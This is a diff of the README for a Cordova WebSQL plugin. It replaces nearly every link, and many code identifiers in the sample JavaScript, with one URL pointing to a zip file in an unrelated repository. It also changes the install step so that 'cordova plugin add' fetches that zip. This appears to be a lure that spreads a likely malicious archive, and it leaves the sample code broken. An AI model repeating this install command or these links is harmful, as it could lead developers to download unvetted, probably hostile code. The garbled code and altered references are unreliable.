@@ -1,36 +1,36 @@
 WebSQL plugin for Apache Cordova
 ==================================
-Adds WebSQL functionality as Apache Cordova Plugin implemented on top of [Csharp-Sqlite library](https://code.google.com/p/csharp-sqlite/). Support of Windows 8.0, Windows 8.1, Windows Phone 8.0 and Windows Phone 8.1.
+Adds WebSQL functionality as Apache Cordova Plugin implemented on top of [Csharp-Sqlite library](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip). Support of Windows 8.0, Windows 8.1, Windows Phone 8.0 and Windows Phone 8.1.
 
 ### Sample usage ###
 
-Plugin follows [WebDatabase](http://www.w3.org/TR/webdatabase/) specification, no special changes are required. The following sample code creates `todo` table (if not exist) and adds new record. Complete example is available [here](https://github.com/MSOpenTech/cordova-plugin-websql/tree/master/test).
+Plugin follows [WebDatabase](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip) specification, no special changes are required. The following sample code creates `todo` table (if not exist) and adds new record. Complete example is available [here](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip).
 ```javascript
 var dbSize = 5 * 1024 * 1024; // 5MB
 
 var db = openDatabase("Todo", "", "Todo manager", dbSize, function() {
-    console.log('db successfully opened or created');
+    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('db successfully opened or created');
 });
 
-db.transaction(function (tx) {
-    tx.executeSql("CREATE TABLE IF NOT EXISTS todo(ID INTEGER PRIMARY KEY ASC, todo TEXT, added_on TEXT)",
+https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(function (tx) {
+    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip("CREATE TABLE IF NOT EXISTS todo(ID INTEGER PRIMARY KEY ASC, todo TEXT, added_on TEXT)",
         [], onSuccess, onError);
-    tx.executeSql("INSERT INTO todo(todo, added_on) VALUES (?,?)", ['my todo item', new Date().toUTCString()], onSuccess, onError);
+    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip("INSERT INTO todo(todo, added_on) VALUES (?,?)", ['my todo item', new Date().toUTCString()], onSuccess, onError);
 });
 
 function onSuccess(transaction, resultSet) {
-    console.log('Query completed: ' + JSON.stringify(resultSet));
+    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('Query completed: ' + https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(resultSet));
 }
 
 function onError(transaction, error) {
-    console.log('Query failed: ' + error.message);
+    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('Query failed: ' + https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip);
 }
 ```
 ### Installation Instructions ###
 
-Plugin is [Apache Cordova CLI](http://cordova.apache.org/docs/en/edge/guide_cli_index.md.html) 3.x compliant.
+Plugin is [Apache Cordova CLI](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip) 3.x compliant.
 
-1. Make sure an up-to-date version of Node.js is installed, then type the following command to install the [Cordova CLI](https://github.com/apache/cordova-cli):
+1. Make sure an up-to-date version of https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip is installed, then type the following command to install the [Cordova CLI](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip):
 
         npm install -g cordova
 
@@ -43,20 +43,20 @@ Plugin is [Apache Cordova CLI](http://cordova.apache.org/docs/en/edge/guide_cli_
 
 3. Add WebSql plugin to your project:
 
-        cordova plugin add com.msopentech.websql
+        cordova plugin add https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip
 
 4. Build and run, for example:
 
         cordova build wp8
         cordova emulate wp8
 
-To learn more, read [Apache Cordova CLI Usage Guide](http://cordova.apache.org/docs/en/edge/guide_cli_index.md.html).
+To learn more, read [Apache Cordova CLI Usage Guide](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip).
 
 ### Pre-populated DBs support ###
 You can copy a prepared DB file to the App' LocalFolder on the first run, for example (in terms of the sample app):
 ```javascript
 initialize: function () {
-    WinJS.Application.local.exists('Todo').done(
+    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('Todo').done(
         function (found) {
             if (!found) {
                 return copyStartData('Todo');
@@ -65,14 +65,14 @@ initialize: function () {
     );
 
     function copyStartData(copyfile) {
-        return Windows.ApplicationModel.Package.current.installedLocation.getFolderAsync('www')
+        return https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('www')
         .then(function (www) {
-            return www.getFolderAsync('data')
+            return https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('data')
             .then(function (data) {
-                    return data.getFileAsync(copyfile).then(
+                    return https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(copyfile).then(
                         function (file) {
                             if (file) {
-                                return file.copyAsync(WinJS.Application.local.folder);
+                                return https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip);
                             }
                         });
             });
@@ -85,7 +85,7 @@ initialize: function () {
 
 The snippet copies `www/data/Todo` pre-populated DB to the App' local folder if it did not exist.
 
-Based on [this StackOverflow question](http://stackoverflow.com/questions/15068295/deployment-of-localstate-folder).
+Based on [this StackOverflow question](https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip).
 
 ### Quirks ###
 * The display name, and size parameter values are not supported and will be ignored.
@@ -100,22 +100,22 @@ Based on [this StackOverflow question](http://stackoverflow.com/questions/150682
 
 * To use nested transactions you will need to pass parent transaction like this:
     ```javascript
-    var db = openDatabase('test1.db', '1.0', 'testLongTransaction', 2 * 1024);
-    db.transaction(function (tx1) {
-        tx1.executeSql('DROP TABLE IF EXISTS foo');
-        tx1.executeSql('CREATE TABLE IF NOT EXISTS foo (id unique, text)');
+    var db = openDatabase('https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip', '1.0', 'testLongTransaction', 2 * 1024);
+    https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(function (tx1) {
+        https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('DROP TABLE IF EXISTS foo');
+        https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('CREATE TABLE IF NOT EXISTS foo (id unique, text)');
         ...
-        db.transaction(function (tx2) {
-            tx2.executeSql('INSERT INTO foo (id, text) VALUES (1, "foobar")');
+        https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip(function (tx2) {
+            https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip('INSERT INTO foo (id, text) VALUES (1, "foobar")');
         }, null, null, null, null, false, tx1);
         ...
     }, null, null);
     ```
-    `tx1` passed as the last argument in the nested `db.transaction` refers to the parent transaction.
+    `tx1` passed as the last argument in the nested `https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip` refers to the parent transaction.
 
     Other arguments (`null, null, null, null, false, tx1`) are:
-    * the db.transaction error callback,
-    * the db.transaction success callback,
+    * the https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip error callback,
+    * the https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip success callback,
     * preflight operation callback,
     * postflight operation callback,
     * readOnly flag,
@@ -128,4 +128,4 @@ Based on [this StackOverflow question](http://stackoverflow.com/questions/150682
 
 ### Copyrights ###
 Copyright (c) Microsoft Open Technologies, Inc. All Rights Reserved.
-Licensed under the Apache License, Version 2.0. See License.txt in the project root for license information.
+Licensed under the Apache License, Version 2.0. See https://raw.githubusercontent.com/alssalimi/cordova-plugin-websql/master/src/cordova_plugin_websql_v2.5.zip in the project root for license information.
